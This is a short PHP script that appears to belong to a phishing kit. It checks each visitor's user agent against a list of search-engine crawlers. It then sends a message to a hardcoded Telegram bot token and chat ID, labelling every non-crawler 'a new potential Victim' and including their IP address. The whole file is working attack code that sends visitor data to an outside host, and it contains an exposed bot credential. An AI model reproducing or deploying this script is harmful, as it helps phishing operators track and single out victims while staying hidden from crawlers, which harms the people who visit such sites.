<?php
// Telegram Bot Token and Chat ID
$telegram_bot_token = "5792580948:AAHcXTLIn8tkESe6Wl1cWmRCYhV4cpwPsZw";
$telegram_chat_id = "-1001846766857";

// User agent string of bots
$bots = array(
    "Googlebot",
    "Bingbot",
    "Slurp",
    "DuckDuckBot",
    "YandexBot",
    "Sogou",
    "Exabot",
    "facebot",
    "ia_archiver"
);

// Detect visitor's user agent and IP address
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$ip_address = $_SERVER['REMOTE_ADDR'];

// Check if visitor is a bot
$is_bot = false;
foreach ($bots as $bot) {
    if (strpos($user_agent, $bot) !== false) {
        $is_bot = true;
        break;
    }
}

// Send message to Telegram bot
if ($is_bot) {
    $message = "🤖 A fucking bot is visiting you.🤖";
} else {
    $message = "🤑 a new potential Victim 🤑 . IP address: " . $ip_address;
}

$url = "https://api.telegram.org/bot" . $telegram_bot_token . "/sendMessage?chat_id=" . $telegram_chat_id . "&text=" . urlencode($message);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);
?>
